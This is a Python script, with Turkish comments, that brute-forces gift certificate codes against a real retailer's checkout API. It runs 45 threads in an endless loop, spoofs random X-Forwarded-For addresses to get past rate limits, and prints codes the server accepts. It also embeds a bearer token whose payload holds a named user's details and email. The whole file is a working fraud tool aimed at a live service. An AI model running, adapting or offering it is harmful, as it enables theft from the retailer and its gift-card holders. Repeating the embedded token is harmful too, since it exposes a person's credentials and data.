import requests
import json
import random
import threading
import queue
import string
import time

# Rastgele IP üret
def random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# API Token
token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3NDU2NjgxNDksImV4cCI6MTc0NTkyNzY0OSwiaWF0IjoxNzQ1NjY4MTQ5LCJVc2VySWQiOiJiMTUyNjJjOS04NmM3LTRkYTQtYTAwOC01OGVhNzU2ZjQzMDUiLCJUaXRsZSI6IkJla2lyIEVyZGVtIiwiRmlyc3ROYW1lIjoiQmVraXIiLCJMYXN0TmFtZSI6IkVyZGVtIiwiRW1haWwiOiJkaXNpeDg1OTI4QGN1ZGNpcy5jb20iLCJJc0F1dGhlbnRpY2F0ZWQiOiJUcnVlIiwiQXBwS2V5IjoiQUY3RjJBMzctQ0M0Qi00RjFDLTg3RkQtRkYzNjQyRjY3RUNCIiwiUHJvdmlkZXIiOiJIZXBzaWJ1cmFkYSIsIlNoYXJlRGF0YVBlcm1pc3Npb24iOiJUcnVlIiwiVGVuYW50Ijoidm9kYWZvbmUiLCJKdGkiOiIwZTk5N2RjYS0xNzVkLTQxODAtYTFmOC1mOTYwOWQ2OTBjYjMiLCJwIjp7InQiOltdfX0.j1K4SvjRYPGU11UWvlCViU_Vx3f77xEn5onmK_h8IO4"

# API URL
url = "https://obiwan-gw.hepsiburada.com/api/v1/giftcert/useGiftCert"

# Header üretici
def make_headers():
    return {
        'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        'Accept': "application/json, text/plain, */*",
        'Accept-Language': "tr-TR,tr;q=0.9",
        'Authorization': token,
        'Origin': "https://checkout.hepsiburada.com",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://checkout.hepsiburada.com/",
        'Sec-Fetch-Site': "same-site",
        'Content-Type': "application/json;charset=utf-8",
        'X-Forwarded-For': random_ip()
    }

# İşlem yapılacak kuponları yöneten fonksiyon
def run_batch(random_code):
    q = queue.Queue()
    for i in range(100):
        for j in range(100):
            q.put(f"HB{i:02d}{random_code}{j:02d}")

    def worker():
        while not q.empty():
            code = q.get()
            payload = {"code": code}
            try:
                headers = make_headers()
                response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=2)
                if response.status_code == 200:
                    print(f"\n\033[92m[+] {code} -> {response.text}\033[0m")
            except:
                pass
            q.task_done()

    threads = []
    for _ in range(45):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# Sonsuz döngü
while True:
    random_code = ''.join(random.choices(string.ascii_uppercase, k=4))
    print(f"\n\033[94m[!] Yeni Kod Seti Başladı: {random_code}\033[0m")
    run_batch(random_code)
    time.sleep(1)  # Yeni set arasında kısa gecikme
